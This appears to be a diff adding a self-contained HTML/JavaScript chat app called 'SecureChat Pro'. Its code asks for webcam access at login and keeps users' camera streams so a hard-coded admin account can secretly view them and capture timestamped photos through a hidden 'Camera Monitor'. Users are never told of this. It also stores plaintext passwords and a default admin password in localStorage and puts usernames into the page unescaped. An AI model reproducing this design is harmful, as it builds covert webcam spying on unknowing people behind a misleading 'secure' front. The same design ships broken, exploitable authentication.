@@ -1,0 +1,1051 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureChat Pro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            width: 100%;
+            max-width: 1200px;
+            min-height: 600px;
+            position: relative;
+        }
+
+        /* Auth Pages */
+        .auth-page {
+            display: none;
+            padding: 60px;
+            text-align: center;
+            min-height: 600px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .auth-page.active {
+            display: flex;
+        }
+
+        .auth-page h2 {
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            font-weight: 300;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #667eea;
+            border: 2px solid #667eea;
+        }
+
+        .btn-secondary:hover {
+            background: #667eea;
+            color: white;
+        }
+
+        /* Chat Page */
+        .chat-page {
+            display: none;
+            height: 600px;
+        }
+
+        .chat-page.active {
+            display: flex;
+        }
+
+        .sidebar {
+            width: 250px;
+            background: #2c3e50;
+            color: white;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            background: #34495e;
+            border-bottom: 1px solid #3d566e;
+        }
+
+        .sidebar-header h3 {
+            margin-bottom: 10px;
+        }
+
+        .user-info {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        .sidebar-nav {
+            flex: 1;
+            padding: 20px 0;
+        }
+
+        .nav-item {
+            padding: 15px 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-left: 3px solid transparent;
+        }
+
+        .nav-item:hover, .nav-item.active {
+            background: #34495e;
+            border-left-color: #3498db;
+        }
+
+        .nav-item i {
+            margin-right: 10px;
+            width: 20px;
+        }
+
+        .logout-btn {
+            padding: 15px 20px;
+            background: #e74c3c;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .logout-btn:hover {
+            background: #c0392b;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: #ecf0f1;
+        }
+
+        .chat-header {
+            padding: 20px;
+            background: white;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .chat-messages {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            background: #f8f9fa;
+        }
+
+        .message {
+            margin-bottom: 15px;
+            padding: 12px 18px;
+            border-radius: 18px;
+            max-width: 80%;
+            word-wrap: break-word;
+            position: relative;
+        }
+
+        .message.own {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin-left: auto;
+            text-align: right;
+        }
+
+        .message.other {
+            background: white;
+            color: #333;
+            border: 1px solid #e1e5e9;
+        }
+
+        .message-info {
+            font-size: 12px;
+            opacity: 0.7;
+            margin-bottom: 5px;
+        }
+
+        .message-content {
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .chat-input {
+            padding: 20px;
+            background: white;
+            border-top: 1px solid #ddd;
+            display: flex;
+            gap: 10px;
+        }
+
+        .chat-input input {
+            flex: 1;
+            padding: 12px 18px;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            font-size: 14px;
+        }
+
+        .chat-input input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .send-btn {
+            padding: 12px 24px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .send-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Camera Section */
+        .camera-section {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .camera-section.active {
+            display: flex;
+        }
+
+        .camera-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .camera-feed {
+            background: #2c3e50;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .camera-feed video {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+        }
+
+        .camera-feed-info {
+            padding: 10px;
+            background: #34495e;
+            color: white;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .camera-feed.offline {
+            opacity: 0.5;
+        }
+
+        .camera-feed.offline::after {
+            content: 'OFFLINE';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #e74c3c;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .success-message {
+            color: #27ae60;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px;
+                border-radius: 15px;
+            }
+
+            .auth-page {
+                padding: 40px 30px;
+            }
+
+            .sidebar {
+                width: 200px;
+            }
+
+            .camera-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Loading animation */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Login Page -->
+        <div id="loginPage" class="auth-page active">
+            <h2>Welcome Back</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="loginUsername">Username</label>
+                    <input type="text" id="loginUsername" required>
+                </div>
+                <div class="form-group">
+                    <label for="loginPassword">Password</label>
+                    <input type="password" id="loginPassword" required>
+                </div>
+                <button type="submit" class="btn">Sign In</button>
+                <button type="button" class="btn btn-secondary" onclick="showRegister()">Create Account</button>
+                <div id="loginError" class="error-message"></div>
+            </form>
+        </div>
+
+        <!-- Register Page -->
+        <div id="registerPage" class="auth-page">
+            <h2>Create Account</h2>
+            <form id="registerForm">
+                <div class="form-group">
+                    <label for="registerUsername">Username</label>
+                    <input type="text" id="registerUsername" required>
+                </div>
+                <div class="form-group">
+                    <label for="registerPassword">Password</label>
+                    <input type="password" id="registerPassword" required>
+                </div>
+                <div class="form-group">
+                    <label for="confirmPassword">Confirm Password</label>
+                    <input type="password" id="confirmPassword" required>
+                </div>
+                <button type="submit" class="btn">Create Account</button>
+                <button type="button" class="btn btn-secondary" onclick="showLogin()">Back to Login</button>
+                <div id="registerError" class="error-message"></div>
+                <div id="registerSuccess" class="success-message"></div>
+            </form>
+        </div>
+
+        <!-- Chat Page -->
+        <div id="chatPage" class="chat-page">
+            <div class="sidebar">
+                <div class="sidebar-header">
+                    <h3>SecureChat Pro</h3>
+                    <div class="user-info">
+                        <div id="currentUser"></div>
+                        <div id="onlineStatus">🟢 Online</div>
+                    </div>
+                </div>
+                <div class="sidebar-nav">
+                    <div class="nav-item active" onclick="showChatSection()" id="chatNav">
+                        <i>💬</i> Chat Room
+                    </div>
+                    <div class="nav-item" onclick="showCameraSection()" id="cameraNav" style="display: none;">
+                        <i>📹</i> Camera Monitor
+                    </div>
+                </div>
+                <button class="logout-btn" onclick="logout()">
+                    <i>🚪</i> Logout
+                </button>
+            </div>
+
+            <div class="main-content">
+                <!-- Chat Section -->
+                <div id="chatSection" class="chat-section active">
+                    <div class="chat-header">
+                        <h3>Global Chat Room</h3>
+                        <div>
+                            <span id="onlineUsers">Loading...</span>
+                        </div>
+                    </div>
+                    <div class="chat-messages" id="chatMessages"></div>
+                    <div class="chat-input">
+                        <input type="text" id="messageInput" placeholder="Type your message..." maxlength="500">
+                        <button class="send-btn" onclick="sendMessage()">Send</button>
+                    </div>
+                </div>
+
+                <!-- Camera Section (Admin Only) -->
+                <div id="cameraSection" class="camera-section">
+                    <div class="chat-header">
+                        <h3>Live Camera Monitor</h3>
+                        <div>
+                            <span id="activeFeeds">0 Active Feeds</span>
+                        </div>
+                    </div>
+                    <div class="camera-grid" id="cameraGrid">
+                        <!-- Camera feeds will be populated here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentUser = null;
+        let userStream = null;
+        let isAdmin = false;
+        let chatInterval = null;
+        let cameraFeeds = new Map();
+
+        // Database simulation using objects
+        let users = {};
+        let chatMessages = [];
+        let onlineUsers = new Set();
+        let lastMessageCount = 0;
+
+        // Initialize app
+        document.addEventListener('DOMContentLoaded', function() {
+            // Load data from localStorage if available
+            loadData();
+            
+            // Set up event listeners
+            setupEventListeners();
+            
+            // Show login page
+            showLogin();
+        });
+
+        function loadData() {
+            try {
+                const savedUsers = localStorage.getItem('chatApp_users');
+                const savedMessages = localStorage.getItem('chatApp_messages');
+                
+                if (savedUsers) {
+                    users = JSON.parse(savedUsers);
+                }
+                
+                if (savedMessages) {
+                    chatMessages = JSON.parse(savedMessages);
+                }
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+
+        function saveData() {
+            try {
+                localStorage.setItem('chatApp_users', JSON.stringify(users));
+                localStorage.setItem('chatApp_messages', JSON.stringify(chatMessages));
+            } catch (error) {
+                console.error('Error saving data:', error);
+            }
+        }
+
+        function setupEventListeners() {
+            // Login form
+            document.getElementById('loginForm').addEventListener('submit', handleLogin);
+            
+            // Register form
+            document.getElementById('registerForm').addEventListener('submit', handleRegister);
+            
+            // Message input enter key
+            document.getElementById('messageInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    sendMessage();
+                }
+            });
+        }
+
+        function showLogin() {
+            document.getElementById('loginPage').classList.add('active');
+            document.getElementById('registerPage').classList.remove('active');
+            document.getElementById('chatPage').classList.remove('active');
+            clearMessages();
+        }
+
+        function showRegister() {
+            document.getElementById('loginPage').classList.remove('active');
+            document.getElementById('registerPage').classList.add('active');
+            document.getElementById('chatPage').classList.remove('active');
+            clearMessages();
+        }
+
+        function clearMessages() {
+            document.getElementById('loginError').textContent = '';
+            document.getElementById('registerError').textContent = '';
+            document.getElementById('registerSuccess').textContent = '';
+        }
+
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            
+            if (!username || !password) {
+                showError('loginError', 'Please fill in all fields');
+                return;
+            }
+            
+            if (!users[username]) {
+                showError('loginError', 'Username not found');
+                return;
+            }
+            
+            if (users[username].password !== password) {
+                showError('loginError', 'Invalid password');
+                return;
+            }
+            
+            // Successful login
+            currentUser = username;
+            isAdmin = username === 'seeker_sagar';
+            onlineUsers.add(username);
+            
+            // Request camera permission
+            await requestCameraPermission();
+            
+            // Show chat page
+            showChatPage();
+        }
+
+        async function handleRegister(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('registerUsername').value.trim();
+            const password = document.getElementById('registerPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            if (!username || !password || !confirmPassword) {
+                showError('registerError', 'Please fill in all fields');
+                return;
+            }
+            
+            if (username.length < 3) {
+                showError('registerError', 'Username must be at least 3 characters');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showError('registerError', 'Password must be at least 6 characters');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                showError('registerError', 'Passwords do not match');
+                return;
+            }
+            
+            if (users[username]) {
+                showError('registerError', 'Username already exists');
+                return;
+            }
+            
+            // Create new user
+            users[username] = {
+                username: username,
+                password: password,
+                createdAt: new Date().toISOString()
+            };
+            
+            saveData();
+            
+            document.getElementById('registerSuccess').textContent = 'Account created successfully! Please login.';
+            document.getElementById('registerForm').reset();
+            
+            setTimeout(() => {
+                showLogin();
+            }, 2000);
+        }
+
+        async function requestCameraPermission() {
+            try {
+                userStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+                
+                // Store user's camera stream for admin monitoring (but not admin's own)
+                if (!isAdmin) {
+                    cameraFeeds.set(currentUser, userStream);
+                }
+                
+                console.log('Camera permission granted');
+            } catch (error) {
+                console.error('Camera permission denied:', error);
+                // Continue without camera if permission denied
+            }
+        }
+
+        function showChatPage() {
+            document.getElementById('loginPage').classList.remove('active');
+            document.getElementById('registerPage').classList.remove('active');
+            document.getElementById('chatPage').classList.add('active');
+            
+            // Update user info
+            document.getElementById('currentUser').textContent = `Logged in as: ${currentUser}`;
+            
+            // Show camera nav for admin
+            if (isAdmin) {
+                document.getElementById('cameraNav').style.display = 'block';
+            }
+            
+            // Add user to online users and register their camera stream
+            onlineUsers.add(currentUser);
+            if (userStream && !isAdmin) {
+                cameraFeeds.set(currentUser, userStream);
+            }
+            
+            // Load chat messages
+            loadChatMessages();
+            
+            // Start chat polling
+            startChatPolling();
+            
+            // Update online users
+            updateOnlineUsers();
+        }
+
+        function showChatSection() {
+            document.getElementById('chatSection').style.display = 'flex';
+            document.getElementById('cameraSection').classList.remove('active');
+            document.getElementById('chatNav').classList.add('active');
+            document.getElementById('cameraNav').classList.remove('active');
+        }
+
+        function showCameraSection() {
+            if (!isAdmin) return;
+            
+            document.getElementById('chatSection').style.display = 'none';
+            document.getElementById('cameraSection').classList.add('active');
+            document.getElementById('chatNav').classList.remove('active');
+            document.getElementById('cameraNav').classList.add('active');
+            
+            loadCameraFeeds();
+        }
+
+        function loadChatMessages() {
+            const messagesContainer = document.getElementById('chatMessages');
+            messagesContainer.innerHTML = '';
+            
+            // Load all messages from localStorage
+            const savedMessages = localStorage.getItem('chatApp_messages');
+            if (savedMessages) {
+                chatMessages = JSON.parse(savedMessages);
+            }
+            
+            // Show last 100 messages
+            const recentMessages = chatMessages.slice(-100);
+            
+            recentMessages.forEach(message => {
+                displayMessage(message);
+            });
+            
+            lastMessageCount = chatMessages.length;
+            
+            // Scroll to bottom
+            messagesContainer.scrollTop = messagesContainer.scrollHeight;
+        }
+
+        function displayMessage(message) {
+            const messagesContainer = document.getElementById('chatMessages');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${message.username === currentUser ? 'own' : 'other'}`;
+            
+            const timestamp = new Date(message.timestamp).toLocaleTimeString();
+            
+            messageDiv.innerHTML = `
+                <div class="message-info">${message.username} • ${timestamp}</div>
+                <div class="message-content">${escapeHtml(message.content)}</div>
+            `;
+            
+            messagesContainer.appendChild(messageDiv);
+            messagesContainer.scrollTop = messagesContainer.scrollHeight;
+        }
+
+        function sendMessage() {
+            const input = document.getElementById('messageInput');
+            const content = input.value.trim();
+            
+            if (!content) return;
+            
+            // Load existing messages first
+            const savedMessages = localStorage.getItem('chatApp_messages');
+            if (savedMessages) {
+                chatMessages = JSON.parse(savedMessages);
+            }
+            
+            const message = {
+                id: Date.now() + Math.random(), // Ensure unique ID
+                username: currentUser,
+                content: content,
+                timestamp: new Date().toISOString()
+            };
+            
+            chatMessages.push(message);
+            
+            // Save immediately to localStorage
+            localStorage.setItem('chatApp_messages', JSON.stringify(chatMessages));
+            
+            displayMessage(message);
+            input.value = '';
+            
+            lastMessageCount = chatMessages.length;
+        }
+
+        function startChatPolling() {
+            // Poll for new messages every 2 seconds
+            chatInterval = setInterval(() => {
+                checkForNewMessages();
+                updateOnlineUsers();
+            }, 2000);
+        }
+
+        function checkForNewMessages() {
+            const savedMessages = localStorage.getItem('chatApp_messages');
+            if (savedMessages) {
+                const currentMessages = JSON.parse(savedMessages);
+                
+                // Check if there are new messages
+                if (currentMessages.length > lastMessageCount) {
+                    const newMessages = currentMessages.slice(lastMessageCount);
+                    
+                    newMessages.forEach(message => {
+                        displayMessage(message);
+                    });
+                    
+                    chatMessages = currentMessages;
+                    lastMessageCount = currentMessages.length;
+                    
+                    // Scroll to bottom
+                    const messagesContainer = document.getElementById('chatMessages');
+                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
+                }
+            }
+        }
+
+        function updateOnlineUsers() {
+            // Load online users from localStorage to sync across tabs
+            const savedOnlineUsers = localStorage.getItem('chatApp_onlineUsers');
+            if (savedOnlineUsers) {
+                const onlineArray = JSON.parse(savedOnlineUsers);
+                onlineUsers = new Set(onlineArray);
+            }
+            
+            // Add current user to online list
+            onlineUsers.add(currentUser);
+            
+            // Save back to localStorage
+            localStorage.setItem('chatApp_onlineUsers', JSON.stringify([...onlineUsers]));
+            
+            const count = onlineUsers.size;
+            document.getElementById('onlineUsers').textContent = `${count} user${count !== 1 ? 's' : ''} online`;
+            
+            // Clean up old offline users (remove users offline for more than 30 seconds)
+            setTimeout(() => {
+                const currentTime = Date.now();
+                const userActivity = JSON.parse(localStorage.getItem('chatApp_userActivity') || '{}');
+                userActivity[currentUser] = currentTime;
+                localStorage.setItem('chatApp_userActivity', JSON.stringify(userActivity));
+                
+                // Remove inactive users
+                Object.keys(userActivity).forEach(user => {
+                    if (currentTime - userActivity[user] > 30000) { // 30 seconds
+                        onlineUsers.delete(user);
+                        delete userActivity[user];
+                    }
+                });
+                
+                localStorage.setItem('chatApp_onlineUsers', JSON.stringify([...onlineUsers]));
+                localStorage.setItem('chatApp_userActivity', JSON.stringify(userActivity));
+            }, 1000);
+        }
+
+        function loadCameraFeeds() {
+            if (!isAdmin) return;
+            
+            const cameraGrid = document.getElementById('cameraGrid');
+            cameraGrid.innerHTML = '';
+            
+            // Get all registered users except the admin
+            const otherUsers = Object.keys(users).filter(username => username !== currentUser);
+            let activeFeeds = 0;
+            
+            if (otherUsers.length === 0) {
+                const noUsersDiv = document.createElement('div');
+                noUsersDiv.style.cssText = 'text-align: center; padding: 40px; color: #666; font-size: 18px;';
+                noUsersDiv.innerHTML = '📹 No other users to monitor<br><small>Other users need to be online for camera access</small>';
+                cameraGrid.appendChild(noUsersDiv);
+                document.getElementById('activeFeeds').textContent = '0 Active Cameras';
+                return;
+            }
+            
+            otherUsers.forEach(username => {
+                const feedDiv = document.createElement('div');
+                feedDiv.className = 'camera-feed';
+                feedDiv.style.cssText = 'background: #2c3e50; border-radius: 10px; overflow: hidden; position: relative; min-height: 250px;';
+                
+                // Check if user is online and has camera access
+                const isUserOnline = onlineUsers.has(username);
+                const hasCamera = cameraFeeds.has(username);
+                
+                if (isUserOnline && hasCamera) {
+                    // Create canvas for photo capture
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    canvas.style.cssText = 'width: 100%; height: 180px; object-fit: cover; background: #000; border-radius: 5px;';
+                    
+                    // Create capture button
+                    const captureBtn = document.createElement('button');
+                    captureBtn.textContent = '📸 Capture Photo';
+                    captureBtn.style.cssText = 'position: absolute; top: 10px; left: 10px; background: #e74c3c; color: white; border: none; padding: 5px 10px; border-radius: 15px; cursor: pointer; font-size: 12px; z-index: 10;';
+                    
+                    captureBtn.onclick = () => captureUserPhoto(username, canvas);
+                    
+                    feedDiv.appendChild(canvas);
+                    feedDiv.appendChild(captureBtn);
+                    activeFeeds++;
+                    
+                    // Add live indicator
+                    const statusDiv = document.createElement('div');
+                    statusDiv.style.cssText = 'position: absolute; top: 10px; right: 10px; background: #27ae60; color: white; padding: 4px 8px; border-radius: 12px; font-size: 12px; z-index: 10;';
+                    statusDiv.textContent = '🟢 READY';
+                    feedDiv.appendChild(statusDiv);
+                    
+                    // Show initial capture
+                    setTimeout(() => captureUserPhoto(username, canvas), 1000);
+                    
+                } else if (isUserOnline && !hasCamera) {
+                    // User is online but camera not accessible
+                    const statusDiv = document.createElement('div');
+                    statusDiv.style.cssText = 'position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #f39c12; font-weight: bold; text-align: center;';
+                    statusDiv.innerHTML = '📷<br>CAMERA<br>UNAVAILABLE';
+                    feedDiv.appendChild(statusDiv);
+                    
+                } else {
+                    // User is offline
+                    const statusDiv = document.createElement('div');
+                    statusDiv.style.cssText = 'position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #e74c3c; font-weight: bold; text-align: center;';
+                    statusDiv.innerHTML = '👤<br>OFFLINE';
+                    feedDiv.appendChild(statusDiv);
+                }
+                
+                // User info at bottom
+                const infoDiv = document.createElement('div');
+                infoDiv.className = 'camera-feed-info';
+                infoDiv.innerHTML = `
+                    <div style="font-weight: bold;">${username}</div>
+                    <div style="font-size: 12px; opacity: 0.8;">
+                        ${isUserOnline ? '🟢 Online' : '🔴 Offline'}
+                        ${hasCamera ? ' • 📹 Camera Ready' : ''}
+                    </div>
+                `;
+                feedDiv.appendChild(infoDiv);
+                
+                cameraGrid.appendChild(feedDiv);
+            });
+            
+            document.getElementById('activeFeeds').textContent = `${activeFeeds} Camera${activeFeeds !== 1 ? 's' : ''} Available`;
+        }
+
+        function captureUserPhoto(username, canvas) {
+            const userCameraStream = cameraFeeds.get(username);
+            if (!userCameraStream) return;
+            
+            // Create a temporary video element to capture frame
+            const video = document.createElement('video');
+            video.srcObject = userCameraStream;
+            video.muted = true;
+            video.autoplay = true;
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                
+                setTimeout(() => {
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Add timestamp
+                    ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+                    ctx.fillRect(0, canvas.height - 25, canvas.width, 25);
+                    ctx.fillStyle = 'white';
+                    ctx.font = '12px Arial';
+                    ctx.fillText(`${username} - ${new Date().toLocaleString()}`, 5, canvas.height - 8);
+                    
+                    // Clean up
+                    video.srcObject = null;
+                }, 500);
+            };
+        }
+
+        function logout() {
+            // Clean up
+            if (userStream) {
+                userStream.getTracks().forEach(track => track.stop());
+                userStream = null;
+            }
+            
+            if (chatInterval) {
+                clearInterval(chatInterval);
+                chatInterval = null;
+            }
+            
+            // Remove user from online status and camera feeds
+            onlineUsers.delete(currentUser);
+            cameraFeeds.delete(currentUser);
+            
+            currentUser = null;
+            isAdmin = false;
+            
+            // Reset forms
+            document.getElementById('loginForm').reset();
+            document.getElementById('registerForm').reset();
+            document.getElementById('messageInput').value = '';
+            
+            // Show login page
+            showLogin();
+        }
+
+        function showError(elementId, message) {
+            document.getElementById(elementId).textContent = message;
+            setTimeout(() => {
+                document.getElementById(elementId).textContent = '';
+            }, 5000);
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Handle page unload
+        window.addEventListener('beforeunload', function() {
+            if (currentUser) {
+                // Clean up online status
+                const savedOnlineUsers = localStorage.getItem('chatApp_onlineUsers');
+                if (savedOnlineUsers) {
+                    const onlineArray = JSON.parse(savedOnlineUsers);
+                    const filteredUsers = onlineArray.filter(user => user !== currentUser);
+                    localStorage.setItem('chatApp_onlineUsers', JSON.stringify(filteredUsers));
+                }
+            }
+            
+            if (userStream) {
+                userStream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // Simulate some initial data for demo
+        if (Object.keys(users).length === 0) {
+            users['seeker_sagar'] = {
+                username: 'seeker_sagar',
+                password: 'admin123',
+                createdAt: new Date().toISOString()
+            };
+            
+            users['demo_user'] = {
+                username: 'demo_user',
+                password: 'password',
+                createdAt: new Date().toISOString()
+            };
+            
+            chatMessages = [
+                {
+                    id: 1,
+                    username: 'System',
+                    content: 'Welcome to SecureChat Pro! Start chatting with other users.',
+                    timestamp: new Date().toISOString()
+                }
+            ];
+            
+            saveData();
+        }
+    </script>
+</body>
+</html>
